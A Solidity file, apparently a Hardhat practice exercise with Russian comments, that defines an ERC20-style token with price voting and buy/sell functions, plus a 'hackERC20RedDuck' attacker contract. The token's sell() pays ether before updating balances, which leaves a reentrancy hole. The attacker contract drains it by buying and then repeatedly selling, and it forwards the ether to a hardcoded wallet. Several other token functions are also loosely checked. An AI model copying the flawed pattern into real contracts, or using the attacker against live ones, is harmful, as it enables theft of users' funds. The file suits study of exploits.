// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

abstract contract ERC20Interface {
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract erc20RedDuck is ERC20Interface {
    using SafeMath for uint256;

    string public name;  // название монеты
    string public symbol; // символ нашей монеты
    uint8 public decimals; // количество цифр после запятой
    uint public coin_price; // gwei за 1 олексириум
    uint16 public voting_duration; //время на голосование в секундах
    uint public voting_summ; //тут храним текущий результат голосования
    uint public voting_end; // время конца голосования
    uint public possible_price; //тут храним цену за которую голосуем, до тех пор, пока не закончилось голосование
    uint public voting_id; // номер текущего голосования
    uint public _totalSupply; // количество монет
    address public owner; // тут всегда храним аккаунт создателя (наш). С него будет отправляться запрос на остановку голосования через 50 минут после старта
    bool public voting_status; //активное ли голосование

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => mapping(uint => bool)) is_voted;

    /*
     базовый конструктор erc20
     */
    constructor(uint8 decimals_, uint totalSupply_, uint coin_price_, uint16 voting_duration_) {
        decimals = decimals_;
        _totalSupply = totalSupply_;
        coin_price = coin_price_;
        voting_duration = voting_duration_;

        owner = address(this);
        balances[owner] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    
    function getOwner() public view returns (address owner_){
        return owner;
    }

    function currentCoinPrice() public view returns (uint CoinPrice){
        return coin_price;
    }

    function votingDuration() public view returns (uint16 Voting_Duration){
        return voting_duration;
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function votingEnd() public view returns (uint votingEnd_){
        return voting_end;
    }

    function possiblePrice() public view returns (uint possiblePrice_){
        return possible_price;
    }

    function votingSumm() public view returns (uint votingSumm_){
        return voting_summ;
    }

    function votingStatus() public view returns (bool status){
        return voting_status;
    }

    function isVoted(address voter, uint votingId_) public view returns (bool voting_status_){   //проголосовал ли адрес в голосовании номер votingId_
        return is_voted[voter][votingId_];
    }

    function votingId() public view returns (uint votingId_){
        return voting_id;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;

        emit Approval(msg.sender, spender, tokens);
        
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);

        emit Transfer(msg.sender, to, tokens);

        return true;
    }

     function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);

        emit Transfer(from, to, tokens);
        
        return true;
    }

        function _transfer(address sender, address recipient, uint256 amount) private {

        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance" );

        balances[sender] = senderBalance.sub(amount);

        balances[recipient] = balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);
    }

    function callvoting(uint new_price) public returns (bool success) {
        require(balances[msg.sender] >= _totalSupply/20, "Your balance is too low to start voiting."); //чтобы вызвать голосование надо хотя бы 5 процентов от эмиссии
        
        require(voting_end < block.timestamp, "Another voting is already started"); //проверяем, нет ли уже запущенного голосования

        voting_end = block.timestamp + voting_duration;  //последняя секунда голосования
        voting_summ = 0; //при запуске голосования голоса обнуляем
        possible_price = new_price; // запоминаем за что голосуем
        voting_id++; //считаем текущий номер голосования
        voting_status = true;

        return true;
    }

    function vote(bool decision) public returns (bool success){

        require(voting_status == true, "The voting has been ended or never started."); //не поздно ли голосуем
        require(!is_voted[msg.sender][voting_id], "You have already voited."); //не голосовал ли этот кошелёк в этом голосовании

        is_voted[msg.sender][voting_id] = true; //теперь проголосовал
        decision == true ? voting_summ += balances[msg.sender] : voting_summ -= balances[msg.sender]; // в зависимости от решения, отнимаем или плюсуем баланс проголосовавшего от общего банка проголосовавших
        
        return true;
    }

    function stopvoting() public returns (bool success){  //эту функцию вызываем мы сами с помощью ether.js ровно через 50 минут после начала голосования
        require(voting_end < block.timestamp, "The voting should stop later"); //не рано ли запустили (ну а вдруг)
         //                                                                  //остановить голосование может любой, главное, чтобы прошло 50 минут (проверяем выше)
        if(voting_summ > 0 )  //если вес голосов "за" больше то меняем текущую цену монеты
        coin_price = possible_price;
        voting_status = false;
        
        return true;
    }

    function buy() external payable {
        uint256 _cost = msg.value / coin_price; // сколько олексириума стоит отправленный эфир 
        if(_cost > balances[owner]){
            revert("Cannot sell Oleksiirium for now"); // если на нашем кошельке недостаточно денег чтобы оплатить покупку - возвращаем эфир отправителю
        }
        else _transfer(owner, msg.sender, _cost); //отправляем олексириум покупателю по текущему курсу
    }
    
    function sell(uint256 _amount) external {
        require(_amount <= balances[msg.sender], "You don`t have this count of tokens"); 
        payable(msg.sender).transfer(_amount / coin_price); //отправляем эфир по текущему курсу
        balances[msg.sender] = balances[msg.sender].sub(_amount); // отнимаем с аккаунта олексириум, который продаёт пользователь
        balances[address(this)] = balances[address(this)].add(_amount); //добавляем олексириум нам

        emit Transfer(msg.sender, address(this), _amount); //такие штуки надо записывать в блокчейн
        

    }

}

contract hackERC20RedDuck {
    erc20RedDuck public victim;
    uint attacksCount;
    address myWallet = parseAddr("0x70997970C51812dc3A010C7d01b50e0d17dc79C8");

    constructor(address victimAddress) {
        victim = erc20RedDuck(victimAddress);
    }

  /*  // Fallback - тип функции, который всегда отвечает на входящие транзакции
    fallback() external payable {
        if(attacksCount < 2){
            if (address(victim).balance >= 1 ether) {
            victim.sell(1);
            attacksCount ++;
           }       
        }
    }
*/
    receive() external payable {
        payable(myWallet).transfer(0.95 ether);
    }
    function attack() external payable {

        require(msg.value >= 1 ether, 'MSG.Value is lower than 1 ether');
        victim.buy{value: 1 ether}();
        for(int i=0; i< 2; i++)
        victim.sell(1);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
}